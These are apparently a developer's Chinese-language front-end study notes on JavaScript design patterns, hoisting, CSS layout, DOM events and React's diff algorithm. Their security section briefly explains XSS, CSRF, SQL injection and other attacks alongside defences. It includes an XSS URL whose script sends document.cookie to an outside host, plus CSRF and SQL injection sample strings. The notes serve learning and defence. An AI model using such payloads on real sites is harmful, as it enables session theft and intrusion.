桥梁模式可以用来弱化它与使用它的类和对象之间的耦合，就是将抽象与其实现隔离开来，以便二者独立变化；
这种模式对于JavaScript中常见的时间驱动的编程有很大益处，桥梁模式最常见和实际的应用场合之一是时间监听器回调函数。先分析一个不好的示例：

#### 装饰者（Decorator）模式
**react组件**

动态地给一个对象添加一些额外的职责。就扩展功能而言，它比生成子类方式更为灵活。
装饰者模式和组合模式有很多共同点，它们都与所包装的对象实现统一的接口并且会把任何方法条用传递给这些对象。

可是组合模式用于把众多子对象组织为一个整体，而装饰者模式用于在不修改现有对象或从派生子类的前提下为其添加方法。
装饰者的运作过程是透明的，这就是说你可以用它包装其他对象，然后继续按之前使用那么对象的方法来使用，从下面的例子中就可以看出。还是从代码中理解吧：

#### 组合（Composite）模式
**react父子组件组成一个整体**

将对象组合成树形结构以表示“部分-整体”的层次结构。它使得客户对单个对象和复合对象的使用具有一致性。
组合模式是一种专为创建Web上的动态用户界面而量身定制的模式。使用这种模式，可以用一条命令在多个对象上激发复杂的或递归的行为。组合模式擅长于对大批对象进行操作。

组合模式的好处：1.程序员可以用同样的方法处理对象的集合与其中的特定子对象；2.它可以用来把一批子对象组织成树形结构，并且使整棵树都可被便利。
组合模式适用范围：1.存在一批组织成某处层次体系的对象（具体结构可能在开发期间无法知道）；2.希望对这批对象或其中的一部分对象实话一个操作。

其实组合模式就是将一系列相似或相近的对象组合在一个大的对象，由这个大对象提供一些常用的接口来对这些小对象进行操作，代码可重用，对外操作简单。例如：对form内的元素，不考虑页面设计的情况下，一般就剩下input了，对于这些input都有name和value的属性，因此可以将这些input元素作为form对象的成员组合起来，form对象提供对外的接口，便可以实现一些简单的操作，比如设置某个input的value，添加/删除某个input等等。

#### 门面（facade）模式
**jquery的$**

子系统中的一组接口提供一个一致的界面，门面模式定义了一个高层接口，这个接口使得这一子系统更加容易使用，
简单的说这是一种组织性的模式，它可以用来修改类和对象的接口，使其更便于使用。
1. 简化类的接口；
2. 消除类与使用它的客户代码之间的耦合。

#### 适配置器（Adapter）模式
**服务端的数据,与state中的做映射,数据校验转换**

将一个类的接口转换成客户希望的另外一个接口。
适配器模式使得原本由于接口不兼容而不能一起工作的那些类可以一起工作，使用这种模式的对象又叫包装器，因为他们是在用一个新的接口包装另一个对象。
1. 用一个新的接口对现有类得接口进行包装
2. 它并不会滤除某些能力，也不会简化接口

#### 命令（Command）模式
**redux 中 diapatch(action) reduce响应**

将一个请求封装为一个对象，从而使你可用不同的请求对客户进行参数化；对请求排队或记录请求日志，以及支持可取消的操作。
命令对象是一个操作和用来调用这个操作的对象的结合体，所有的命名对象都有一个执行操作，其用途就是调用命令对象所绑定的操作。

#### 观察者（Observer）模式
定义对象间的一种一对多的依赖关系，以便当一个对象的状态发生改变时，所有依赖于它的对象都得到通知并自动刷新
观察者模式是开发基于行为的应用程序的有力手段，前端程序员可做的就是借助一个事件监听器替你处理各种行为，从而降低内存消耗和提高互动性能。

* 在DOM的编程环境中的高级事件模式中，事件监听器说到底就是一种内置的观察者

#### 享元（Flyweight）模式
运用共享技术有效地支持大量细粒度的对象。

#### 代理（Proxy）模式
此模式最基本的形式是对访问进行控制。代理对象和另一个对象（本体）实现的是同样的接口，可是实际上工作还是本体在做，它才是负责执行所分派的任务的那个对象或类，代理对象不会在另以对象的基础上修改任何方法，也不会简化那个对象的接口。

#### 职责链（Chain Of Responsibility）模式

为解除请求的发送者和接收者之间耦合，而使多个对象都有机会处理这个请求。将这些对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它。
职责链由多个不同类型的对象组成：发送者是发出请求的对象，而接收者则是接收请求并且对其进行处理或传递的对象，请求本身有时也是一个对象，它封装着与操作有关的所有数据。

典型的流程大致是：
1. 发送者知道链中第一个接收者，它向这个接收者发出请求。
2. 每一个接收者都对请求进行分析，然后要么处理它，要么将其往下传。
3. 每一个接收者知道的其他对象只有一个，即它在链中的下家。
4. 如果没有任何接收者处理请求，那么请求将从链上离开，不同的实现对此也有不同的反应，一般会抛出一个错误。

职责链模式的适用范围:
1. 有多个的对象可以处理一个请求，哪个对象处理该请求运行时刻自动确定
2. 想在不明确指定接收者的情况下，向多个对象中的一个提交一个请求
3. 可处理一个请求的对象集合需要被动态指定

确实对这种模式不了解，相关资料也较少，所以代码先不上了。看看大家对这个模式有木有什么好的理解或者能较好表达这种模式的代码，谢谢了。

### 声明提前

```
function test() {
  console.log(a);
  console.log(foo());
  var a = 1;
  function foo() {
  return 2;
  }}
test();
```
变量和函数的声明都被提前至函数体的顶部，而同时变量并没有被赋值。因此，当打印变量a时，它虽存在于函数体（因为a已经被声明），但仍然是undefined。
换句话说，上面的代码等同于下面的代码：

```
function test() {
  var a;
  function foo() {
  return 2;
  }
  console.log(a);
  console.log(foo());
  a = 1;
}
test();
```

### this
函数体内: this指代全局对象(window/undefind)
函数体外: 指的是函数执行的上下文,取决于函数是如何调用的


### [用js实现基本算法][sorts]

### 数据可视化

大数据 + 前端可视化

* 大数据, NOSQL
* 理解产品需求, 整个数据信息展示路径清晰, 数据结构非常重要, 前后端统一标准
* 了解数据结构, 熟悉数组对象的操作, 将一个或多个api的数据进行整合
* 前端可视化, 就是数据的具体表现形式, 可以是柱状图/饼图/折现图, 也可以是热力图/关系图/飞行图
* 用到的前端工具的话, echarts/react/ichart/three.js
* echarts 比较推荐, 底层是canvas, 性能流畅度比较高, 交互性也比较好, 移动支持, 生态圈大, 文档全, 可拓展性好
* D3 直接对 DOM 进行操作
* 数据是用来帮助用户做决策的, 增加一些分析工具

### css布局

* 使用float, boostrap源码中的栅格系统, 
```
.row:before,
.row:after {
  display: table;
  content: " ";
}
.row {
  margin-right: -15px;
  margin-left: -15px;
}
.col-xs-1, .col-sm-1, .col-md-1, .col-lg-1 {
  position: relative;
  min-height: 1px;
  padding-right: 15px;
  padding-left: 15px;
}
.col-xs-1, .col-xs-2, .col-xs-3 {
  float: left;
}
.col-xs-1 {
  width: 8.33333333%;
}
.col-xs-12 {
  width: 100%;
}
```
* 使用[flexbox][flexbox-ruan], 在caniuse里可以查看浏览器兼容性
```
.box{
  display: flex; //inline-flex;
  flex-direction: row | row-reverse | column | column-reverse;
  flex-wrap: nowrap | wrap | wrap-reverse;
  //flex-flow: <flex-direction> || <flex-wrap>;
  justify-content: flex-start | flex-end | center | space-between | space-around;
  align-items: flex-start | flex-end | center | baseline | stretch;
  align-content: flex-start | flex-end | center | space-between | space-around | stretch;
}

.item {
  order: <integer>; //属性定义项目的排列顺序。数值越小，排列越靠前，默认为0
  flex-grow: <number>; //定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大
  flex-shrink: <number>; //属性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小
  flex-basis: <length> | auto; //定义了在分配多余空间之前，项目占据的主轴空间（main size）
  //flex: none | [ <'flex-grow'> <'flex-shrink'>? || <'flex-basis'> ]
  align-self: auto | flex-start | flex-end | center | baseline | stretch; //允许单个项目有与其他项目不一样的对齐方式

}
```
* 使用display/position设置 
```
.box {
  display: block; 
}
.item {
  display: inline-block; 
  width: 25%; 
}
```

xmlhttprequest




### 前端安全

常见攻击手段

* xss( cross-site scripting),跨域脚本攻击
  > `book.com/search?name=<script>document.location='http://vajoy/get?cookie='+document.cookie</script>`
  > 提供的免费wifi, 邮件, 链接
  > 对于XSS的预防自然也是对提交数据的过滤，另外还有一点——谨慎返回用户提交的内容！
  > 不要相信 任何 来自用户的输入（不仅限于 POST Body/QueryString/payload，甚至是 Headers）
* CSRF (Cross-site request forgery), 跨站点伪造攻击
  > a.com  `<a href="http://a.com/logout.php">登出</a>`
  > b.com  `<img src="http://a.com/logout.php">`
  > 给所有请求加上 token 检查。token 一般是随机字符串，只需确保其不可预测性即可。token 可以在 QueryString、POST body 甚至是 Custom Header 里，但千万不能在 Cookies 里。
* SQL注入, XPath
  > book.com/book?id=100 => book.com/book?id=100'or'1'='1
  > 对于这几个攻击，我们需要做的自然是对提交参数的过滤，最好是前端过滤一遍，后端也过滤一遍
* ddos(分布式拒绝服务), 
  > cdn
* http
  > 明文传输
* 重发攻击
  > 他知道这些数据的作用，就可以在不知道数据内容的情况下通过再次发送这些数据达到愚弄接收端的目的
  > 实现了流量攻击，即通过额外增加的数据流影响正常数据流的传输时延，耗用通信链路的带宽
  > 加随机数/加时间戳/加流水号
* 中间人攻击
  > 是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。
* 网络劫持攻击
* cookie泄露

安全策略    

* 压缩compression, 混淆obfuscation, 加密encryption 增加客户端代码不可读性
* 非对称加密, 客户端的只能服务端解密
* 哈希进行信息摘要, md5加密token等信息
* Salt
* cookie加密 
* OAuth 2.0 授权
* token 随机, 每一次的请求携带下一次请求的token

### [restful api][restful-api]


### js事件

* HTML 事件可以是浏览器行为，也可以是用户行为
* DOM2.0模型将事件处理流程分为三个阶段：一、事件捕获阶段，二、事件目标阶段，三、事件冒泡阶段
* 在web dom编程时 js事件驱动极致
* addEventListener(event, function, useCapture)
* 向原元素添加/删除事件句柄
  > element.addEventListener("click", function(){ alert("Hello World!"); });
  > element.removeEventListener("mousemove", myFunction);
* 向同一个元素中添加多个事件句柄
  ```
  element.addEventListener("mouseover", myFunction);
  element.addEventListener("click", mySecondFunction);
  element.addEventListener("mouseout", myThirdFunction);
  ```
* 事件传递有两种方式：冒泡与捕获
* 在 冒泡 中，内部元素的事件会先被触发，然后再触发外部元素，即： <p> 元素的点击事件先触发，然后会触发 <div> 元素的点击事件。
* 在 捕获 中，外部元素的事件会先被触发，然后才会触发内部元素的事件，即： <div> 元素的点击事件先触发 ，然后再触发 <p> 元素的点击事件。
* 事件委托
  1. 管理的函数变少了。不需要为每个元素都添加监听函数。对于同一个父节点下面类似的子元素，可以通过委托给父元素的监听函数来处理事件。
  2. 可以方便地动态添加和修改元素，不需要因为元素的改动而修改事件绑定。
  3. JavaScript和DOM节点之间的关联变少了，这样也就减少了因循环引用而带来的内存泄漏发生的概率。
* 当我们需要对很多元素添加事件的时候，可以通过将事件添加到它们的父节点而将事件委托给父节点来触发处理函数, 这主要得益于浏览器的事件冒泡机制
```
<ul id="parent-list">
  <li id="post-1">Item 1</li>
  <li id="post-2">Item 2</li>
  <li id="post-3">Item 3</li>
  <li id="post-4">Item 4</li>
  <li id="post-5">Item 5</li>
  <li id="post-6">Item 6</li>
</ul>

function addListeners4Li(liNode){
    liNode.onclick = function clickHandler(){...};
    liNode.onmouseover = function mouseOverHandler(){...}
}

window.onload = function(){
    var ulNode = document.getElementById("parent-list");
    var liNodes = ulNode.getElementByTagName("Li");
    for(var i=0, l = liNodes.length; i < l; i++){
        addListeners4Li(liNodes[i]);
    }   
}

// 获取父节点，并为它添加一个click事件
document.getElementById("parent-list").addEventListener("click",function(e) {
  // 检查事件源e.targe是否为Li
  if(e.target && e.target.nodeName.toUpperCase == "LI") {
    // 真正的处理过程在这里
    console.log("List item ",e.target.id.replace("post-")," was clicked!");
  }
});
```


### react 源码解析

#### 项目架构
从目录结构看出, 它是一个典型的大厂项目
项目分模块开发, 每一个模块都有自己的测试用例
官方文档也在这里面, 托管在github主机上, 可持续化集成
项目同时会发布 react/react-dom/react-native/react-art
里面代码的规范性写法对我启发颇多

#### components 组件

#### diff 算法

[diff算法][react-diff-zhihu]

* React 通过制定大胆的 diff 策略，将 O(n3) 复杂度的问题转换成 O(n) 复杂度的问题；
* React 通过分层求异的策略，对 tree diff 进行算法优化；
* React 通过相同类生成相似树形结构，不同类生成不同树形结构的策略，对 component diff 进行算法优化；
* React 通过设置唯一 key的策略，对 element diff 进行算法优化；
* 建议，在开发组件时，保持稳定的 DOM 结构会有助于性能的提升；
* 建议，在开发过程中，尽量减少类似将最后一个节点移动到列表首部的操作，当节点数量过大或更新操作过于频繁时，在一定程度上会影响 React 的渲染性能。


[ulr-happen]:http://fex.baidu.com/blog/2014/05/what-happen/
[how-browsers-work]:https://www.html5rocks.com/en/tutorials/internals/howbrowserswork/
[cross-domain]:https://segmentfault.com/a/1190000009624849?utm_source=75teamweekly&utm_medium=referral
[Access-control-CORS]:https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS
[gtmetrix]:https://gtmetrix.com/
[es5-shim]:https://github.com/es-shims/es5-shim
[html5shiv]:https://github.com/aFarkas/html5shiv
[karma]: http://karma-runner.github.io
[modernizr]:https://github.com/Modernizr/Modernizr
[closures]:https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures
[prototype]:https://www.zhihu.com/question/34183746
[design-patterns]:http://www.cnblogs.com/Darren_code/archive/2011/08/31/JavascripDesignPatterns.html#!comments
[sorts]:https://github.com/damonare/Sorts
[react-diff-zhihu]:http://zhuanlan.zhihu.com/purerender/20346379
[flexbox]:https://css-tricks.com/snippets/css/a-guide-to-flexbox/
[flexbox-ruan]:http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html
[restful-api]:http://www.ruanyifeng.com/blog/2014/05/restful_api.html

